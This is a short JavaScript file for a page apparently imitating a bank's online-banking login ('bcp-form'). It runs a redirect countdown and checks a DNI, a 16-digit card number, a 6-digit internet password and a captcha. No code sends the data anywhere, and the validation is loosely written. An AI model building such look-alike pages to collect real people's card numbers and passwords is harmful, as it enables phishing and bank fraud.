var timeleft = 300;
var downloadTimer = setInterval(function () {
  if (timeleft <= 0) {
    clearInterval(downloadTimer);
    document.getElementById("timer").innerHTML = "";
    // Simulate an HTTP redirect:
    window.location.href = "../principal/index.html";
  } else {
    document.getElementById("timer").innerHTML = "Esta ventana se cerrará en " + timeleft + " segundos";
  }
  timeleft -= 1;
}, 1000);

document.getElementById('continuar-button').addEventListener('click', function () {
  const form = document.getElementById('bcp-form');

  form.addEventListener('submit', function (event) {
    let valid = true;

    const dni = document.getElementById('dni').value.trim();
    const tarjeta = document.getElementById('tarjeta').value.trim();
    const clave = document.getElementById('clave').value.trim();
    const captcha = document.getElementById('captcha').value.trim();

    if (dni === '' || dni.length != 8) {
      alert('Por favor, ingrese su DNI.');
      valid = false;
    }

    if (tarjeta.length !== 16) {
      alert('El número de tarjeta debe tener 16 dígitos.');
      valid = false;
    }

    if (clave.length !== 6) {
      alert('La clave de internet debe tener 6 dígitos.');
      valid = false;
    }

    if (captcha === '') {
      alert('Por favor, ingrese el código captcha.');
      valid = false;
    }

    if (!valid) {
      return;
    }
  });
});